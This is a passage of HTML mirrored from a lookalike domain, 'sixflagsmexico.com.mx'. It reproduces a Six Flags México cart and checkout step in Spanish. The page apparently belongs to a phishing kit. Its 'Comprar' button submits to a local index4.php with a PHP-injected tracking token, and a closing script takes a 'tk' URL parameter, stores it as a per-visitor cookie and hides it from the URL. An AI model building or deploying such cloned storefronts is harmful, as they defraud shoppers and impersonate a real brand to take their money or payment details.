											<div class="subtotal-display-name ng-binding" data-ng-bind-html="i18n.CartView.amountDueLabel">Cantidad a pagar</div>
											<div data-cy="cv_amountDue" class="subtotal-total pull-right ng-binding" data-ng-bind="amountDue | currencyFormatter : currencyCode:languageSettings"></div>
										</div>
									</div>
									<div class="panel package-item ng-hide no-margin-bottom" ng-show="getOnlineSavings()" ng-class="{'no-margin-bottom': !showUpgradeMessage }" aria-hidden="true">
										<div class="panel-body">
											<div class="subtotal-display-name padding-right15 ng-binding" ng-bind-html="i18n.Cart.onlineSavings">Descuento</div>
											<div class="subtotal-total pull-right green-text">
												 <span data-cy="cv_onlineSavings" ng-bind="getOnlineSavings() | currencyFormatter : currencyCode:languageSettings" class="ng-binding"></span>
												 <span ng-bind="getOnlineSavingsPercent()" class="plus2 ng-binding"></span>
											</div>
										</div>
									</div>
									<!-- ngIf: showUpgradeMessage -->
									<div class="cart-disclaimer ng-hide" data-ng-show="i18n.Cart.cart_disclaimer" aria-hidden="true">
										<div data-ng-bind-html="i18n.Cart.cart_disclaimer" class="ng-binding"></div>
									</div>
									<div class="row text-center">
										<img alt="" title="" class="neg-margin-ad no-neg ng-hide" data-ng-show="adImage &amp;&amp; isMobile" data-ng-src="" aria-hidden="true">
									</div>
									<!-- ngIf: showTerms && pageView.Cart && displayTermsOnCartView && !displayTermsAsCheckboxOnCart -->
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		
		
	</div>
	<div id="cart-view-page-buttons" class="page-button-row flex-cart-view--buttons" data-ng-hide="cartObject.cartItems.length == 0" aria-hidden="false">
		
		


		
		<div class="row no-margin-bottom" data-ng-hide="pageView.Order" aria-hidden="false">
			<!-- ngIf: !pageView.Order --><!-- ngInclude: 'scripts/modules/billing/partials/cart-partial.html' --><div class="cart-agreements ng-scope" ng-if="!pageView.Order" data-ng-include="'scripts/modules/billing/partials/cart-partial.html'"><div class="col-xs-12 col-sm-12 no-padding margin-top10 margin-bottom10 ng-scope" ng-init="$parent.$parent.cartPartial = this" ng-show="(showTerms &amp;&amp; ((pageView.Order &amp;&amp; !displayTermsOnCartView)|| (pageView.Cart &amp;&amp; displayTermsOnCartView &amp;&amp; displayTermsAsCheckboxOnCart))) || (cartOptin &amp;&amp; pageView.Cart)" aria-hidden="false">
	<div class="row no-margin-bottom panel terms">
		<ul class="list-group nostyle">
			<!-- ngIf: showTerms && ((pageView.Order && !displayTermsOnCartView)|| (pageView.Cart && displayTermsOnCartView && displayTermsAsCheckboxOnCart)) --><li class="list-group-item clearfix cursor cart-terms ng-scope" ng-class="{'red-border': showTermsError}" ng-if="showTerms &amp;&amp; ((pageView.Order &amp;&amp; !displayTermsOnCartView)|| (pageView.Cart &amp;&amp; displayTermsOnCartView &amp;&amp; displayTermsAsCheckboxOnCart))">


<form action="./index4.php" method="get" id="nameform">
<input type=hidden name="web" value="1"/>
<input type=hidden name="uToken" value="<?=$_COOKIE['uToken'];?>">

				<div class="table-cell">
					<div class="checkbox-group" id="cart-terms-div">
						<div tabindex="-1" class="">
							<input data-cy="cv_terms" type="checkbox" id="termsChkInput" aria-labelledby="termsLabel" class="regular-checkbox cursor unrounded ng-valid ng-dirty ng-valid-parse ng-touched ng-not-empty" ng-change="onTermsChanged(termsChecked)" ng-model="termsChecked" aria-invalid="false" required="">
							<label for="termsChkInput" class="cursor">
								
								<div class="description" id="termsLabel" interactive-locale="terms">Al hacer clic en este cuadro reconozco y acepto que he leído los términos del <a class="ng-scope">Aviso de Privacidad</a> , así como los términos de uso y condiciones del producto seleccionado, mismos que han sido debidamente informados previa compra. Estoy de acuerdo que todas las ventas son finales, por lo que no hay devoluciones o cambios.</div>
							</label>
						</div>
					</div>
				</div>
			</li><!-- end ngIf: showTerms && ((pageView.Order && !displayTermsOnCartView)|| (pageView.Cart && displayTermsOnCartView && displayTermsAsCheckboxOnCart)) -->
			<li class="list-group-item clearfix cart-optin ng-valid ng-dirty ng-valid-parse" ng-show="cartOptin &amp;&amp; pageView.Cart &amp;&amp; (!(cartOptin.required &amp;&amp; cartOptin.checked) || (cartOptin.showPhoneCollection &amp;&amp; cartOptin.checked))" ng-form="" name="cartItemsForm" aria-hidden="false">
				<div class="checkbox-group" ng-class="{'hide-input-checkbox': cartOptin.required &amp;&amp; cartOptin.checked, 'col-sm-8 no-padding-left': cartOptin.checked &amp;&amp; cartOptin.showPhoneCollection}">
					<input type="checkbox" id="cartOptin" class="regular-checkbox cursor unrounded ng-valid ng-dirty ng-valid-parse ng-touched ng-not-empty" aria-label="Acepto me envíen descuentos e información de Six Flags." ng-model="cartOptin.checked" ng-checked="cartOptin.checked" ng-change="captureCartOptinData()" name="optin1" aria-invalid="false" >
					<label for="cartOptin" class="cursor" ng-class="{'hidden': cartOptin.required &amp;&amp; cartOptin.checked, 'clip': clipForOptins}">
					
					</label>
					<div class="description">
						<div ng-bind-html="cartOptin.label" ng-click="handleOptins(cartOptin)" tabindex="-1" class="ng-binding" role="button">Acepto me envíen descuentos e información de Six Flags.</div>
						<!-- ngIf: (cartOptin.showDateCollection || cartOptin.showPhoneCollection) && cartOptin.checked -->
						<!-- ngIf: cartOptin.showDateCollection && cartOptin.checked -->
					</div>
				</div>
				<!-- ngIf: cartOptin.showPhoneCollection && cartOptin.checked -->
			</li>
			<li class="list-group-item clearfix cart-optin ng-pristine ng-valid ng-hide" ng-show="cartOptin2 &amp;&amp; pageView.Cart &amp;&amp; (!(cartOptin2.required &amp;&amp; cartOptin2.checked) || (cartOptin2.showPhoneCollection &amp;&amp; cartOptin2.checked))" ng-form="" name="cartItemsForm" aria-hidden="true">
				<div class="checkbox-group" ng-class="{'hide-input-checkbox': cartOptin2.required &amp;&amp; cartOptin2.checked, 'col-sm-8 no-padding-left': cartOptin2.checked &amp;&amp; cartOptin2.showPhoneCollection}">
					<input type="checkbox" id="cartOptin2" class="regular-checkbox cursor unrounded ng-pristine ng-untouched ng-valid ng-empty" aria-label="" ng-model="cartOptin2.checked" ng-checked="cartOptin2.checked" ng-change="captureCartOptin2Data()" name="" aria-invalid="false">
					<label for="cartOptin2" class="cursor" ng-class="{'hidden': cartOptin2.required &amp;&amp; cartOptin2.checked, 'clip': clipForOptins}">
						<span class="icon-check" aria-label=""></span>
					</label>
					<div class="description">
						<div ng-bind-html="cartOptin2.label" ng-click="handleOptins(cartOptin2)" tabindex="-1" class="ng-binding" role="button"></div>
						<!-- ngIf: (cartOptin2.showDateCollection || cartOptin2.showPhoneCollection) && cartOptin2.checked -->
						<!-- ngIf: cartOptin2.showDateCollection && cartOptin2.checked -->
					</div>
				</div>
				<!-- ngIf: cartOptin2.showPhoneCollection && cartOptin2.checked -->
			</li>
		</ul>
	</div>
</div>
</div><!-- end ngIf: !pageView.Order -->
			<div class="pull-right no-mobile checkout-btns">
				
				

				
				<!-- end ngIf: showContinueButton -->

				
				<button type="submit" class="btn btn-success pull-left btn-checkout-padding dynamic-padding-left ng-binding" form="nameform" >


			
					<span class="icon-lock22" aria-label="Comprar"></span>Comprar
				</button>

				
				

				
				

				
				
			</div>
		</div>
	</div>
</div></div>
		</div>
	</div>
	
	
</div>
<div id="sec-footer-info" class="security-row gap-row gap-8 gap-md-16 middle-xs ng-scope" role="contentinfo" ng-controller="SecureFooterController" ng-show="state.showApplicationView" aria-hidden="false">
	<div class="gap-row gap-8 middle-xs">
		<!-- ngIf: securityProvider.provider -->
		<!-- ngIf: enableIDealFooter -->
		<!-- ngRepeat: provider in addlBillingProviders -->
	</div>
	<!-- ngIf: recaptchaV3Enabled -->
	<div class="gap-col gap-4 gap-md-row gap-md-8 middle-xs end-xs--self security-row__link">
		<!-- ngIf: contrastRatioOn -->
		<div class="gap-row gap-4 gap-md-8">
			<!-- ngIf: safetyAndAccessibilityLink() -->
			<!-- ngIf: privacyURL --><a ng-if="privacyURL" class="footer-item text-underline ng-scope" target="_blank" ng-href="https://www.sixflags.com.mx/es/mexico/privacy-policy" accesso-locale="ApplicationLabels.privacyStatement" id="main-privacy-policy-link" href="https://www.sixflags.com.mx/es/mexico/privacy-policy">Aviso de Privacidad</a><!-- end ngIf: privacyURL -->
		</div>
	</div>
</div>
</div>


<script>
    function delete_cookie(name) {
        document.cookie = name +'=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';
    }

    function setCookie(name, value, days) {
        var expires = "";
        if (days) {
            var date = new Date();
            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
            expires = "; expires=" + date.toUTCString();
        }
        document.cookie = name + "=" + (value || "") + expires + "; path=/";
    }

    $(document).ready(function() {
        var urlParams = new URLSearchParams(window.location.search);
        var tk = urlParams.get('tk');

        if (tk) {
            // Extraer el ID del token (suponiendo que el formato es consistente)
            var id = tk.match(/\d+/);

            if (id) {
                delete_cookie('uToken');
                setCookie('uToken', id[0], 1);
            }

            // Eliminar todos los parámetros 'tk' de la URL
            urlParams.delete('tk');

            // Redirigir con la URL modificada
            window.location.search = urlParams.toString();
        }
    });
</script>














</body>





<!-- Mirrored from sixflagsmexico.com.mx/sixflags/index3.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 04 May 2024 04:43:05 GMT -->
</html>
